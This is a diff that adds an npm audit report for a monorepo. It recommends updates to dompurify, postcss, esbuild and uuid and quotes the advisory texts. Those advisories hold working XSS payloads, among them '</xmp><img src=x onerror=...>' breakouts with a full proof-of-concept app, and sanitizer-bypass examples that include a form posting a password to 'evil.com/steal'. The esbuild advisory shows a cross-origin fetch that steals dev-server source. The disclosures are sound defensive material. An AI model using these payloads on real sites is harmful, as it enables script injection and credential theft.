@@ -1,0 +1,604 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1116663,
+          "path": "packages__creator>@antdv-next/x>mermaid>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116950,
+          "path": "packages__creator>@antdv-next/x>mermaid>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116951,
+          "path": "packages__creator>@antdv-next/x>mermaid>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116952,
+          "path": "packages__creator>@antdv-next/x>mermaid>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "dompurify",
+      "target": "3.4.1",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1117015,
+          "path": "packages__creator>vite-plugin-vue-devtools>vite-plugin-vue-inspector>@vue/babel-plugin-jsx>@vue/babel-plugin-resolve-type>@vue/compiler-sfc>postcss",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "postcss",
+      "target": "8.5.10",
+      "depth": 7
+    },
+    {
+      "action": "review",
+      "module": "esbuild",
+      "resolves": [
+        {
+          "id": 1102341,
+          "path": "packages__agent>drizzle-kit>@esbuild-kit/esm-loader>@esbuild-kit/core-utils>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "dompurify",
+      "resolves": [
+        {
+          "id": 1115529,
+          "path": "packages__slidev>@slidev/cli>monaco-editor>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115668,
+          "path": "packages__slidev>@slidev/cli>monaco-editor>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115921,
+          "path": "packages__slidev>@slidev/cli>monaco-editor>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1115922,
+          "path": "packages__slidev>@slidev/cli>monaco-editor>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116663,
+          "path": "packages__slidev>@slidev/cli>monaco-editor>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116950,
+          "path": "packages__slidev>@slidev/cli>monaco-editor>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116951,
+          "path": "packages__slidev>@slidev/cli>monaco-editor>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1116952,
+          "path": "packages__slidev>@slidev/cli>monaco-editor>dompurify",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "uuid",
+      "resolves": [
+        {
+          "id": 1116970,
+          "path": "packages__creator>@antdv-next/x>mermaid>uuid",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1102341": {
+      "findings": [
+        {
+          "version": "0.18.20",
+          "paths": [
+            "packages__agent>drizzle-kit>@esbuild-kit/esm-loader>@esbuild-kit/core-utils>esbuild"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99\n- https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d\n- https://github.com/advisories/GHSA-67mh-4wv8-2f99",
+      "created": "2025-02-10T17:48:07.000Z",
+      "id": 1102341,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+      "reported_by": null,
+      "title": "esbuild enables any website to send any requests to the development server and read the response",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "esbuild",
+      "vulnerable_versions": "<=0.24.2",
+      "github_advisory_id": "GHSA-67mh-4wv8-2f99",
+      "recommendation": "Upgrade to version 0.25.0 or later",
+      "patched_versions": ">=0.25.0",
+      "updated": "2025-02-10T17:48:08.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99"
+    },
+    "1115529": {
+      "findings": [
+        {
+          "version": "3.2.7",
+          "paths": [
+            "packages__slidev>@slidev/cli>monaco-editor>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-h8r8-wccr-v5f2\n- https://github.com/cure53/DOMPurify/releases/tag/3.3.2\n- https://github.com/advisories/GHSA-h8r8-wccr-v5f2",
+      "created": "2026-03-27T20:41:29.000Z",
+      "id": 1115529,
+      "npm_advisory_id": null,
+      "overview": "## Description\n\nA mutation-XSS (mXSS) condition was confirmed when sanitized HTML is reinserted into a new parsing context using `innerHTML` and special wrappers. The vulnerable wrappers confirmed in browser behavior are `script`, `xmp`, `iframe`, `noembed`, `noframes`, and `noscript`. The payload remains seemingly benign after `DOMPurify.sanitize()`, but mutates during the second parse into executable markup with an event handler, enabling JavaScript execution in the client (`alert(1)` in the PoC).\n\n\n## Vulnerability\n\nThe root cause is context switching after sanitization: sanitized output is treated as trusted and concatenated into a wrapper string (for example, `<xmp> ... </xmp>` or other special wrappers) before being reparsed by the browser. In this flow, attacker-controlled text inside an attribute (for example `</xmp>` or equivalent closing sequences for each wrapper) closes the special parsing context early and reintroduces attacker markup (`<img ... onerror=...>`) outside the original attribute context. DOMPurify sanitizes the original parse tree, but the application performs a second parse in a different context, reactivating dangerous tokens (classic mXSS pattern).\n\n## PoC\n\n1. Start the PoC app:\n```bash\nnpm install\nnpm start\n```\n\n2. Open `http://localhost:3001`.\n3. Set `Wrapper en sink` to `xmp`.\n4. Use payload:\n```html\n <img src=x alt=\"</xmp><img src=x onerror=alert('expoc')>\">\n```\n\n5. Click `Sanitize + Render`.\n6. Observe:\n- `Sanitized response` still contains the `</xmp>` sequence inside `alt`.\n- The sink reparses to include `<img src=\"x\" onerror=\"alert('expoc')\">`.\n- `alert('expoc')` is triggered.\n7. Files:\n- index.html\n\n```html\n<!doctype html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>expoc - DOMPurify SSR PoC</title>\n    <style>\n      :root {\n        --bg: #f7f8fb;\n        --panel: #ffffff;\n        --line: #d8dce6;\n        --text: #0f172a;\n        --muted: #475569;\n        --accent: #0ea5e9;\n      }\n\n      * {\n        box-sizing: border-box;\n      }\n\n      body {\n        margin: 0;\n        font-family: \"SF Mono\", Menlo, Consolas, monospace;\n        color: var(--text);\n        background: radial-gradient(circle at 10% 0%, #e0f2fe 0%, var(--bg) 60%);\n      }\n\n      main {\n        max-width: 980px;\n        margin: 28px auto;\n        padding: 0 16px 20px;\n      }\n\n      h1 {\n        margin: 0 0 10px;\n        font-size: 1.45rem;\n      }\n\n      p {\n        margin: 0;\n        color: var(--muted);\n      }\n\n      .grid {\n        display: grid;\n        gap: 14px;\n        margin-top: 16px;\n      }\n\n      .card {\n        background: var(--panel);\n        border: 1px solid var(--line);\n        border-radius: 12px;\n        padding: 14px;\n      }\n\n      label {\n        display: block;\n        margin-bottom: 7px;\n        font-size: 0.85rem;\n        color: var(--muted);\n      }\n\n      textarea,\n      input,\n      select,\n      button {\n        width: 100%;\n        border: 1px solid var(--line);\n        border-radius: 8px;\n        padding: 9px 10px;\n        font: inherit;\n        background: #fff;\n      }\n\n      textarea {\n        min-height: 110px;\n        resize: vertical;\n      }\n\n      .row {\n        display: grid;\n        grid-template-columns: 1fr 230px;\n        gap: 12px;\n      }\n\n      button {\n        cursor: pointer;\n        background: var(--accent);\n        color: #fff;\n        border-color: #0284c7;\n      }\n\n      #sink {\n        min-height: 90px;\n        border: 1px dashed #94a3b8;\n        border-radius: 8px;\n        padding: 10px;\n        background: #f8fafc;\n      }\n\n      pre {\n        margin: 0;\n        white-space: pre-wrap;\n        word-break: break-word;\n      }\n\n      .note {\n        margin-top: 8px;\n        font-size: 0.85rem;\n      }\n\n      .status-grid {\n        display: grid;\n        grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));\n        gap: 8px;\n        margin-top: 10px;\n      }\n\n      .status-item {\n        border: 1px solid var(--line);\n        border-radius: 8px;\n        padding: 8px 10px;\n        font-size: 0.85rem;\n        background: #fff;\n      }\n\n      .status-item.vuln {\n        border-color: #ef4444;\n        background: #fef2f2;\n      }\n\n      .status-item.safe {\n        border-color: #22c55e;\n        background: #f0fdf4;\n      }\n\n      @media (max-width: 760px) {\n        .row {\n          grid-template-columns: 1fr;\n        }\n      }\n    </style>\n  </head>\n  <body>\n    <main>\n      <h1>expoc - DOMPurify Server-Side PoC</h1>\n      <p>\n        Flujo: input -> POST /sanitize (Node + jsdom + DOMPurify) -> render vulnerable con innerHTML.\n      </p>\n\n      <div class=\"grid\">\n        <section class=\"card\">\n          <label for=\"payload\">Payload</label>\n          <textarea id=\"payload\"><img src=x alt=\"</script><img src=x onerror=alert('expoc')>\"></textarea>\n          <div class=\"row\" style=\"margin-top: 10px;\">\n            <div>\n              <label for=\"wrapper\">Wrapper en sink</label>\n              <select id=\"wrapper\">\n                <option value=\"div\">div</option>\n                <option value=\"textarea\">textarea</option>\n                <option value=\"title\">title</option>\n                <option value=\"style\">style</option>\n                <option value=\"script\" selected>script</option>\n                <option value=\"xmp\">xmp</option>\n                <option value=\"iframe\">iframe</option>\n                <option value=\"noembed\">noembed</option>\n                <option value=\"noframes\">noframes</option>\n                <option value=\"noscript\">noscript</option>\n              </select>\n            </div>\n            <div style=\"display:flex;align-items:end;\">\n              <button id=\"run\" type=\"button\">Sanitize + Render</button>\n            </div>\n          </div>\n          <p class=\"note\">Se usa render vulnerable: <code>sink.innerHTML = '&lt;wrapper&gt;' + sanitized + '&lt;/wrapper&gt;'</code>.</p>\n          <div class=\"status-grid\">\n            <div class=\"status-item vuln\">script (vulnerable)</div>\n            <div class=\"status-item vuln\">xmp (vulnerable)</div>\n            <div class=\"status-item vuln\">iframe (vulnerable)</div>\n            <div class=\"status-item vuln\">noembed (vulnerable)</div>\n            <div class=\"status-item vuln\">noframes (vulnerable)</div>\n            <div class=\"status-item vuln\">noscript (vulnerable)</div>\n            <div class=\"status-item safe\">div (no vulnerable)</div>\n            <div class=\"status-item safe\">textarea (no vulnerable)</div>\n            <div class=\"status-item safe\">title (no vulnerable)</div>\n            <div class=\"status-item safe\">style (no vulnerable)</div>\n          </div>\n        </section>\n\n        <section class=\"card\">\n          <label>Sanitized response</label>\n          <pre id=\"sanitized\">(empty)</pre>\n        </section>\n\n        <section class=\"card\">\n          <label>Sink</label>\n          <div id=\"sink\"></div>\n        </section>\n      </div>\n    </main>\n\n    <script>\n      const payload = document.getElementById('payload');\n      const wrapper = document.getElementById('wrapper');\n      const run = document.getElementById('run');\n      const sanitizedNode = document.getElementById('sanitized');\n      const sink = document.getElementById('sink');\n\n      run.addEventListener('click', async () => {\n        const response = await fetch('/sanitize', {\n          method: 'POST',\n          headers: { 'Content-Type': 'application/json' },\n          body: JSON.stringify({ input: payload.value })\n        });\n\n        const data = await response.json();\n        const sanitized = data.sanitized || '';\n        const w = wrapper.value;\n\n        sanitizedNode.textContent = sanitized;\n        sink.innerHTML = '<' + w + '>' + sanitized + '</' + w + '>';\n      });\n    </script>\n  </body>\n</html>\n```\n\n- server.js\n\n```js\nconst express = require('express');\nconst path = require('path');\nconst { JSDOM } = require('jsdom');\nconst createDOMPurify = require('dompurify');\n\nconst app = express();\nconst port = process.env.PORT || 3001;\n\nconst window = new JSDOM('').window;\nconst DOMPurify = createDOMPurify(window);\n\napp.use(express.json());\napp.use(express.static(path.join(__dirname, 'public')));\n\napp.get('/health', (_req, res) => {\n  res.json({ ok: true, service: 'expoc' });\n});\n\napp.post('/sanitize', (req, res) => {\n  const input = typeof req.body?.input === 'string' ? req.body.input : '';\n  const sanitized = DOMPurify.sanitize(input);\n  res.json({ sanitized });\n});\n\napp.listen(port, () => {\n  console.log(`expoc running at http://localhost:${port}`);\n});\n```\n\n- package.json\n\n```json\n{\n  \"name\": \"expoc\",\n  \"version\": \"1.0.0\",\n  \"main\": \"server.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n    \"start\": \"node server.js\",\n    \"dev\": \"node server.js\"\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"description\": \"\",\n  \"dependencies\": {\n    \"dompurify\": \"^3.3.1\",\n    \"express\": \"^5.2.1\",\n    \"jsdom\": \"^28.1.0\"\n  }\n}\n```\n\n## Evidence\n\n- PoC\n\n[daft-video.webm](https://github.com/user-attachments/assets/499a593d-0241-4ab8-95a9-cf49a00bda90)\n\n- XSS triggered\n<img width=\"2746\" height=\"1588\" alt=\"daft-img\" src=\"https://github.com/user-attachments/assets/1f463c14-d5a3-4c93-94e4-12d2d02c7d15\" />\n\n## Why This Happens\nThis is a mutation-XSS pattern caused by a parse-context mismatch:\n\n- Parse 1 (sanitization phase): input is interpreted under normal HTML parsing rules.\n- Parse 2 (sink phase): sanitized output is embedded into a wrapper that changes parser state (`xmp` raw-text behavior).\n- Attacker-controlled sequence (`</xmp>`) gains structural meaning in parse 2 and alters DOM structure.\n\nSanitization is not a universal guarantee across all future parsing contexts. The sink design reintroduces risk.\n\n## Remediation Guidance\n1. Do not concatenate sanitized strings into new HTML wrappers followed by `innerHTML`.\n2. Keep the rendering context stable from sanitize to sink.\n3. Prefer DOM-safe APIs (`textContent`, `createElement`, `setAttribute`) over string-based HTML composition.\n4. If HTML insertion is required, sanitize as close as possible to final insertion context and avoid wrapper constructs with raw-text semantics (`xmp`, `script`, etc.).\n5. Add regression tests for context-switch/mXSS payloads (including `</xmp>`, `</noscript>`, similar parser-breakout markers).\n\nReported by Oscar Uribe, Security Researcher at Fluid Attacks. Camilo Vera and Cristian Vargas from the Fluid Attacks Research Team have identified a mXSS via Re-Contextualization in DomPurify 3.3.1.\n\nFollowing Fluid Attacks [Disclosure Policy](https://fluidattacks.com/advisories/policy), if this report corresponds to a vulnerability and the conditions outlined in the policy are met, this advisory will be published on the website over the next few days (the timeline may vary depending on maintainers' willingness to attend to and respond to this report) at the following URL: https://fluidattacks.com/advisories/daft\n\nAcknowledgements: [Camilo Vera](https://github.com/caverav/) and [Cristian Vargas](https://github.com/tachote).",
+      "reported_by": null,
+      "title": "DOMPurify is vulnerable to mutation-XSS via Re-Contextualization ",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "dompurify",
+      "vulnerable_versions": "<3.3.2",
+      "github_advisory_id": "GHSA-h8r8-wccr-v5f2",
+      "recommendation": "Upgrade to version 3.3.2 or later",
+      "patched_versions": ">=3.3.2",
+      "updated": "2026-03-27T20:41:31.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-h8r8-wccr-v5f2"
+    },
+    "1115668": {
+      "findings": [
+        {
+          "version": "3.2.7",
+          "paths": [
+            "packages__slidev>@slidev/cli>monaco-editor>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-0540\n- https://github.com/cure53/DOMPurify/commit/fca0a938b4261ddc9c0293a289935a9029c049f5\n- https://github.com/cure53/DOMPurify\n- https://www.vulncheck.com/advisories/dompurify-xss-via-missing-rawtext-elements-in-safe-for-xml\n- https://github.com/cure53/DOMPurify/commit/302b51de22535cc90235472c52e3401bedd46f80\n- https://fluidattacks.com/advisories/daft\n- https://github.com/cure53/DOMPurify/releases/tag/3.3.2\n- https://github.com/advisories/GHSA-v2wj-7wpq-c8vv",
+      "created": "2026-03-03T18:31:33.000Z",
+      "id": 1115668,
+      "npm_advisory_id": null,
+      "overview": "DOMPurify 3.1.3 through 3.3.1 and 2.5.3 through 2.5.8, fixed in 2.5.9 and 3.3.2, contain a cross-site scripting vulnerability that allows attackers to bypass attribute sanitization by exploiting five missing rawtext elements (noscript, xmp, noembed, noframes, iframe) in the `SAFE_FOR_XML` regex. Attackers can include payloads like `</noscript><img src=x onerror=alert(1)>` in attribute values to execute JavaScript when sanitized output is placed inside these unprotected rawtext contexts.",
+      "reported_by": null,
+      "title": "DOMPurify contains a Cross-site Scripting vulnerability",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-0540"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "dompurify",
+      "vulnerable_versions": ">=3.1.3 <=3.3.1",
+      "github_advisory_id": "GHSA-v2wj-7wpq-c8vv",
+      "recommendation": "Upgrade to version 3.3.2 or later",
+      "patched_versions": ">=3.3.2",
+      "updated": "2026-03-30T14:51:32.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-v2wj-7wpq-c8vv"
+    },
+    "1115921": {
+      "findings": [
+        {
+          "version": "3.2.7",
+          "paths": [
+            "packages__slidev>@slidev/cli>monaco-editor>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-cjmm-f4jc-qw8r\n- https://github.com/cure53/DOMPurify/releases/tag/3.3.2\n- https://github.com/advisories/GHSA-cjmm-f4jc-qw8r",
+      "created": "2026-04-03T03:46:07.000Z",
+      "id": 1115921,
+      "npm_advisory_id": null,
+      "overview": "## Summary\nDOMPurify allows `ADD_ATTR` to be provided as a predicate function via `EXTRA_ELEMENT_HANDLING.attributeCheck`. When the predicate returns `true`, `_isValidAttribute` short-circuits the attribute check before URI-safe validation runs. An attacker who supplies a predicate that accepts specific attribute/tag combinations can then sanitize input such as `<a href=\"javascript:alert(document.domain)\">` and have the `javascript:` URL survive, because URI validation is skipped for that attribute while other checks still pass. The provided PoC accepts `href` for anchors and then triggers a click inside an iframe, showing that the sanitized payload executes despite the protocol bypass.\n\n## Impact\nPredicate-based allowlisting bypasses DOMPurify's URI validation, allowing unsafe protocols such as `javascript:` to reach the DOM and execute whenever the link is activated, resulting in DOM-based XSS.\n\n## Credits\nIdentified by Cantina’s Apex (https://www.cantina.security).",
+      "reported_by": null,
+      "title": "DOMPurify ADD_ATTR predicate skips URI validation",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "dompurify",
+      "vulnerable_versions": "<=3.3.1",
+      "github_advisory_id": "GHSA-cjmm-f4jc-qw8r",
+      "recommendation": "Upgrade to version 3.3.2 or later",
+      "patched_versions": ">=3.3.2",
+      "updated": "2026-04-03T03:46:08.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-183"
+      ],
+      "url": "https://github.com/advisories/GHSA-cjmm-f4jc-qw8r"
+    },
+    "1115922": {
+      "findings": [
+        {
+          "version": "3.2.7",
+          "paths": [
+            "packages__slidev>@slidev/cli>monaco-editor>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-cj63-jhhr-wcxv\n- https://github.com/cure53/DOMPurify/releases/tag/3.3.2\n- https://github.com/advisories/GHSA-cj63-jhhr-wcxv",
+      "created": "2026-04-03T03:45:08.000Z",
+      "id": 1115922,
+      "npm_advisory_id": null,
+      "overview": "## Summary\nWhen `USE_PROFILES` is enabled, DOMPurify rebuilds `ALLOWED_ATTR` as a plain array before populating it with the requested allowlists. Because the sanitizer still looks up attributes via `ALLOWED_ATTR[lcName]`, any `Array.prototype` property that is polluted also counts as an allowlisted attribute. An attacker who can set `Array.prototype.onclick = true` (or a runtime already subject to prototype pollution) can thus force DOMPurify to keep event handlers such as `onclick` even when they are normally forbidden. The provided PoC sanitizes `<img onclick=...>` with `USE_PROFILES` and adds the sanitized output to the DOM; the polluted prototype allows the event handler to survive and execute, turning what should be a blocklist into a silent XSS vector.\n\n## Impact\nPrototype pollution makes DOMPurify accept dangerous event handler attributes, which bypasses the sanitizer and results in DOM-based XSS once the sanitized markup is rendered.\n\n## Credits\nIdentified by Cantina’s Apex (https://www.cantina.security).",
+      "reported_by": null,
+      "title": "DOMPurify USE_PROFILES prototype pollution allows event handlers",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "dompurify",
+      "vulnerable_versions": "<=3.3.1",
+      "github_advisory_id": "GHSA-cj63-jhhr-wcxv",
+      "recommendation": "Upgrade to version 3.3.2 or later",
+      "patched_versions": ">=3.3.2",
+      "updated": "2026-04-03T03:45:08.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-cj63-jhhr-wcxv"
+    },
+    "1116663": {
+      "findings": [
+        {
+          "version": "3.2.7",
+          "paths": [
+            "packages__slidev>@slidev/cli>monaco-editor>dompurify"
+          ]
+        },
+        {
+          "version": "3.3.3",
+          "paths": [
+            "packages__creator>@antdv-next/x>mermaid>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-39q2-94rc-95cp\n- https://github.com/advisories/GHSA-39q2-94rc-95cp",
+      "created": "2026-04-16T00:46:35.000Z",
+      "id": 1116663,
+      "npm_advisory_id": null,
+      "overview": "## Summary\nIn `src/purify.ts:1117-1123`, `ADD_TAGS` as a function (via `EXTRA_ELEMENT_HANDLING.tagCheck`) bypasses `FORBID_TAGS` due to short-circuit evaluation.\n\nThe condition:\n```\n!(tagCheck(tagName)) && (!ALLOWED_TAGS[tagName] || FORBID_TAGS[tagName])\n```\nWhen `tagCheck(tagName)` returns `true`, the entire condition is `false` and the element is kept — `FORBID_TAGS[tagName]` is never evaluated.\n\n## Inconsistency\nThis contradicts the attribute-side pattern at line 1214 where `FORBID_ATTR` explicitly wins first:\n```\nif (FORBID_ATTR[lcName]) { continue; }\n```\nFor tags, FORBID should also take precedence over ADD.\n\n## Impact\nApplications using both `ADD_TAGS` as a function and `FORBID_TAGS` simultaneously get unexpected behavior — forbidden tags are allowed through. Config-dependent but a genuine logic inconsistency.\n\n## Suggested Fix\nCheck `FORBID_TAGS` before `tagCheck`:\n```\nif (FORBID_TAGS[tagName]) { /* remove */ }\nelse if (tagCheck(tagName) || ALLOWED_TAGS[tagName]) { /* keep */ }\n```\n\n## Affected Version\nv3.3.3 (commit 883ac15)",
+      "reported_by": null,
+      "title": "DOMPurify's ADD_TAGS function form bypasses FORBID_TAGS due to short-circuit evaluation",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "dompurify",
+      "vulnerable_versions": "<=3.3.3",
+      "github_advisory_id": "GHSA-39q2-94rc-95cp",
+      "recommendation": "Upgrade to version 3.4.0 or later",
+      "patched_versions": ">=3.4.0",
+      "updated": "2026-04-16T00:46:36.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-783"
+      ],
+      "url": "https://github.com/advisories/GHSA-39q2-94rc-95cp"
+    },
+    "1116950": {
+      "findings": [
+        {
+          "version": "3.2.7",
+          "paths": [
+            "packages__slidev>@slidev/cli>monaco-editor>dompurify"
+          ]
+        },
+        {
+          "version": "3.3.3",
+          "paths": [
+            "packages__creator>@antdv-next/x>mermaid>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-h7mw-gpvr-xq4m\n- https://github.com/cure53/DOMPurify/releases/tag/3.4.0\n- https://github.com/advisories/GHSA-h7mw-gpvr-xq4m",
+      "created": "2026-04-22T17:34:17.000Z",
+      "id": 1116950,
+      "npm_advisory_id": null,
+      "overview": "There is an inconsistency between FORBID_TAGS and FORBID_ATTR handling when function-based ADD_TAGS is used.\n\nCommit [c361baa](https://github.com/cure53/DOMPurify/commit/c361baa18dbdcb3344a41110f4c48ad85bf48f80) added an early exit for FORBID_ATTR at line 1214:\n\n    /* FORBID_ATTR must always win, even if ADD_ATTR predicate would allow it */\n    if (FORBID_ATTR[lcName]) {\n      return false;\n    }\n\nThe same fix was not applied to FORBID_TAGS. At line 1118-1123, when EXTRA_ELEMENT_HANDLING.tagCheck returns true, the short-circuit evaluation skips the FORBID_TAGS check entirely:\n\n    if (\n      !(\n        EXTRA_ELEMENT_HANDLING.tagCheck instanceof Function &&\n        EXTRA_ELEMENT_HANDLING.tagCheck(tagName)  // true -> short-circuits\n      ) &&\n      (!ALLOWED_TAGS[tagName] || FORBID_TAGS[tagName])  // never evaluated\n    ) {\n\nThis allows forbidden elements to survive sanitization with their attributes intact.\n\nPoC (tested against current HEAD in Node.js + jsdom):\n\n    const DOMPurify = createDOMPurify(window);\n\n    DOMPurify.sanitize(\n      '<iframe src=\"https://evil.com\"></iframe>',\n      {\n        ADD_TAGS: function(tag) { return true; },\n        FORBID_TAGS: ['iframe']\n      }\n    );\n    // Returns: '<iframe src=\"https://evil.com\"></iframe>'\n    // Expected: '' (iframe forbidden)\n\n    DOMPurify.sanitize(\n      '<form action=\"https://evil.com/steal\"><input name=password></form>',\n      {\n        ADD_TAGS: function(tag) { return true; },\n        FORBID_TAGS: ['form']\n      }\n    );\n    // Returns: '<form action=\"https://evil.com/steal\"><input name=\"password\"></form>'\n    // Expected: '<input name=\"password\">' (form forbidden)\n\nConfirmed affected: iframe, object, embed, form. The src/action/data attributes survive because attribute sanitization runs separately and allows these URLs.\n\nCompare with FORBID_ATTR which correctly wins:\n\n    DOMPurify.sanitize(\n      '<p onclick=\"alert(1)\">hello</p>',\n      {\n        ADD_ATTR: function(attr) { return true; },\n        FORBID_ATTR: ['onclick']\n      }\n    );\n    // Returns: '<p>hello</p>' (onclick correctly removed)\n\nSuggested fix: add FORBID_TAGS early exit before the tagCheck evaluation, mirroring line 1214:\n\n    /* FORBID_TAGS must always win, even if ADD_TAGS predicate would allow it */\n    if (FORBID_TAGS[tagName]) {\n      // proceed to removal logic\n    }\n\nThis requires function-based ADD_TAGS in the config, which is uncommon. But the asymmetry with the FORBID_ATTR fix is clear, and the impact includes iframe and form injection with external URLs.\n\nReporter: Koda Reef",
+      "reported_by": null,
+      "title": "DOMPurify: FORBID_TAGS bypassed by function-based ADD_TAGS predicate (asymmetry with FORBID_ATTR fix)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41240"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "dompurify",
+      "vulnerable_versions": "<3.4.0",
+      "github_advisory_id": "GHSA-h7mw-gpvr-xq4m",
+      "recommendation": "Upgrade to version 3.4.0 or later",
+      "patched_versions": ">=3.4.0",
+      "updated": "2026-04-22T17:34:18.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79",
+        "CWE-183"
+      ],
+      "url": "https://github.com/advisories/GHSA-h7mw-gpvr-xq4m"
+    },
+    "1116951": {
+      "findings": [
+        {
+          "version": "3.2.7",
+          "paths": [
+            "packages__slidev>@slidev/cli>monaco-editor>dompurify"
+          ]
+        },
+        {
+          "version": "3.3.3",
+          "paths": [
+            "packages__creator>@antdv-next/x>mermaid>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
